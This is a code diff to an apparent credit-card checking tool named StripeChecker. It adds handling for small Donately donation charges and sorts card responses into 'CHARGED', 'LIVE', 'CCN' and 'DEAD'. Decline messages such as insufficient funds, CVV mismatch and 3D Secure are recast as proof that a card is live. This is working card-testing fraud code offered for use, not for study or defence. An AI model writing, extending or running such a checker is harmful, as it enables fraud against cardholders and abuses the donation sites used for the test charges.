@@ -203,7 +203,21 @@ class StripeChecker:
     def parse_response(self, response):
         """Parse the charge response and determine status"""
         if isinstance(response, dict):
-            # Check for success
+            # Check for Donately successful donation response
+            # Format: {'object': 'donation', 'data': {'status': 'processed', ...}}
+            if response.get('object') == 'donation':
+                data = response.get('data', {})
+                if data.get('status') == 'processed':
+                    amount = data.get('amount_formatted', '$1.00')
+                    donation_id = data.get('id', 'N/A')
+                    return {
+                        'success': True,
+                        'status': 'CHARGED',
+                        'message': f'Payment Success! {amount} Charged [ID: {donation_id}]',
+                        'code': 'charged'
+                    }
+            
+            # Check for generic success
             if response.get('success') or response.get('status') == 'success':
                 return {
                     'success': True,
@@ -212,33 +226,33 @@ class StripeChecker:
                     'code': 'approved'
                 }
             
-            # Check for specific error messages
-            error = response.get('error', response.get('message', ''))
+            # Get error message from response
+            error = response.get('message', response.get('error', ''))
             if isinstance(error, dict):
                 error = error.get('message', str(error))
             
             error_lower = str(error).lower()
             
-            # CVV/CVC related
-            if any(x in error_lower for x in ['cvc', 'cvv', 'security code', 'incorrect_cvc']):
+            # CVV/CVC related - Card is LIVE but wrong CVV
+            if any(x in error_lower for x in ['cvc', 'cvv', 'security code', 'incorrect_cvc', 'security_code']):
                 return {
                     'success': False,
                     'status': 'CCN',
-                    'message': 'Incorrect CVC/CVV',
+                    'message': 'CVV Mismatch - Card Live',
                     'code': 'ccn'
                 }
             
-            # Insufficient funds
+            # Insufficient funds - Card is LIVE
             if 'insufficient' in error_lower or 'funds' in error_lower:
                 return {
                     'success': False,
                     'status': 'LIVE',
-                    'message': 'Insufficient Funds',
+                    'message': 'Insufficient Funds - Card Live',
                     'code': 'insufficient_funds'
                 }
             
-            # Card declined but live indicators
-            if any(x in error_lower for x in ['do_not_honor', 'do not honor', 'transaction_not_allowed']):
+            # Do not honor - Card is LIVE
+            if any(x in error_lower for x in ['do_not_honor', 'do not honor', 'transaction_not_allowed', 'not_allowed']):
                 return {
                     'success': False,
                     'status': 'LIVE',
@@ -246,13 +260,40 @@ class StripeChecker:
                     'code': 'do_not_honor'
                 }
             
-            # 3D Secure
-            if '3d' in error_lower or 'authentication' in error_lower:
+            # 3D Secure required - Card is LIVE
+            if any(x in error_lower for x in ['3d', 'authentication', 'authenticate', '3ds']):
                 return {
                     'success': False,
                     'status': 'LIVE',
-                    'message': '3D Secure Required',
+                    'message': '3D Secure Required - Card Live',
                     'code': '3ds_required'
+                }
+            
+            # Lost/Stolen card
+            if any(x in error_lower for x in ['lost', 'stolen', 'pickup', 'pick up']):
+                return {
+                    'success': False,
+                    'status': 'DEAD',
+                    'message': 'Lost/Stolen Card',
+                    'code': 'lost_stolen'
+                }
+            
+            # Expired card
+            if 'expired' in error_lower or 'expir' in error_lower:
+                return {
+                    'success': False,
+                    'status': 'DEAD',
+                    'message': 'Card Expired',
+                    'code': 'expired'
+                }
+            
+            # Invalid card number
+            if any(x in error_lower for x in ['invalid', 'incorrect_number', 'invalid_number']):
+                return {
+                    'success': False,
+                    'status': 'DEAD',
+                    'message': 'Invalid Card Number',
+                    'code': 'invalid'
                 }
             
             # Generic decline
@@ -260,17 +301,8 @@ class StripeChecker:
                 return {
                     'success': False,
                     'status': 'DECLINED',
-                    'message': error or 'Card Declined',
+                    'message': str(error) or 'Card Declined',
                     'code': 'declined'
-                }
-            
-            # Invalid card
-            if any(x in error_lower for x in ['invalid', 'expired', 'incorrect_number']):
-                return {
-                    'success': False,
-                    'status': 'DEAD',
-                    'message': error or 'Invalid Card',
-                    'code': 'invalid'
                 }
             
             # Rate limit
@@ -282,17 +314,26 @@ class StripeChecker:
                     'code': 'rate_limit'
                 }
             
+            # If we have any error message, show it
+            if error:
+                return {
+                    'success': False,
+                    'status': 'DECLINED',
+                    'message': str(error),
+                    'code': 'unknown'
+                }
+            
             return {
                 'success': False,
-                'status': 'DECLINED',
-                'message': error or 'Unknown Response',
+                'status': 'UNKNOWN',
+                'message': 'Unknown Response - Check Debug',
                 'code': 'unknown'
             }
         
         return {
             'success': False,
             'status': 'ERROR',
-            'message': 'Invalid Response',
+            'message': 'Invalid Response Format',
             'code': 'error'
         }
 
@@ -403,15 +444,16 @@ def print_result(card, result, index, total):
     status = result.get('status', 'ERROR')
     message = result.get('message', 'Unknown')
     
-    # Status symbols and colors simulation
+    # Status symbols
     status_icons = {
-        'CHARGED': '[+] CHARGED',
-        'LIVE': '[~] LIVE',
-        'CCN': '[#] CCN',
-        'DECLINED': '[-] DECLINED',
-        'DEAD': '[x] DEAD',
-        'ERROR': '[!] ERROR',
-        'RATE_LIMITED': '[!] RATE LIMITED'
+        'CHARGED': '[$$] CHARGED <<<',
+        'LIVE': '[++] LIVE',
+        'CCN': '[##] CCN (Live)',
+        'DECLINED': '[--] DECLINED',
+        'DEAD': '[xx] DEAD',
+        'ERROR': '[!!] ERROR',
+        'RATE_LIMITED': '[!!] RATE LIMITED',
+        'UNKNOWN': '[??] UNKNOWN'
     }
     
     status_display = status_icons.get(status, f'[?] {status}')
